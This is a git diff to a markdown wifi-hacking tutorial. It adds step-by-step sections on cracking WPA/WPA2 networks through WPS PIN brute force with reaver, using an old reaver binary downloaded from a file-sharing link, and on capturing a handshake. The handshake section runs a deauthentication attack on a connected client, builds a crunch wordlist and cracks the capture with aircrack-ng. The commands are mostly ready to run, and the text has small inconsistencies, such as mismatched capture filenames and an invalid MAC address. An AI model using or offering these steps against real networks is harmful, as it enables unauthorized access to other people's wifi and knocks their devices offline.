@@ -22,7 +22,8 @@
   - [Gaining Access](#gaining-access)
     - [WEP Cracking](#wep-cracking)
     - [Fake Authentication](#fake-authentication)
-    - [WPA/WPA2 Cracking](#wpa-wpa2-cracking)
+    - [WPA/WPA2 Cracking WPS Enable Networks](#wpa-wpa2-cracking-wps-enable-networks)
+    - [WPA/WPA2 Cracking Handshake](#wpa-wpa2-cracking-handshake)
 
 
   - [Post Connection Attacks](#post-connection-attacks)
@@ -319,10 +320,15 @@ see that KEY
 
 Remove all colon symbol ":" in that key found [41:45:76:98]
 
-> Password : 41457698
-<br><br>
+> Password : 41457698 
 
-### WPA WPA2 Cracking
+<br><br><br>
+
+
+
+
+### WPA WPA2 Cracking WPS Enable Networks
+- This attaack only for work WPS enable networks
 
 **Open terminal - 1**
 > see all the WPS enable Networks <br>
@@ -359,7 +365,6 @@ you can see "Terminal - 2" that wps pin is password:
 <br>
 
 
-
 **Error:**
 Now getting an error and this is actually a bug with the last versions of reaver
 
@@ -367,7 +372,7 @@ Now getting an error and this is actually a bug with the last versions of reaver
 Use older version of reaver. it's work perfectly <br>
 
 > [Download reaver](https://www.mediafire.com/file/9mjizwkeru2qf7x/reaver/file) - old version <br>
-> change dirctory to download
+> change dirctory to download <br>
 > change the permission of this file to an executable
 ```
 cd download
@@ -377,6 +382,53 @@ chmod +x reaver
 ```
 ./reaver --bssid 70:97:41:DA:E0:5B --channel 1 --interface wlan0mon -vvv --no-associate
 ```
+
+<br><br><br>
+
+
+
+### WPA WPA2 Cracking Handshake
+
+
+**Open terminal - 1**
+> find target MAC Address and Channel <br>
+> targeted packet sniffing 
+```
+airodump-ng wlan0mon
+airodump-ng --bssid 70:97:41:DA:E0:5B --channel 6 --write wps_handshake wlan0mon
+```
+<br>
+
+**Open terminal - 2**
+> death attack - Re-connect device to that network
+```
+aireplay-ng --deauth 4 -a 70:97:41:DA:E0:5B -c 48:5D:60:45:G6:25 wlan0mon
+```
+-a - target MAC Address <br>
+-c - clint MAC Address - Re-connect device to that network
+
+**Open terminal - 3**
+> Creat a world list using crunch
+```
+crunch 6 8 abc12 -o test.txt
+```
+crunch - tool name <br>
+6 - minimum numbers of password <br>
+8 - maximum numbers of password <br>
+abc12 - character of password <br>
+-o - write to file <br>
+test.txt - file name <br>
+
+> using worldlist to attack and crack file
+```
+aircrack-ng wpa_handshake-01.cap -w test.txt
+```
+KEY FOUND! [UAUERSXR] <br>
+"UAUERSXR" is the password of the our target network
+
+
+
+
 
 
 
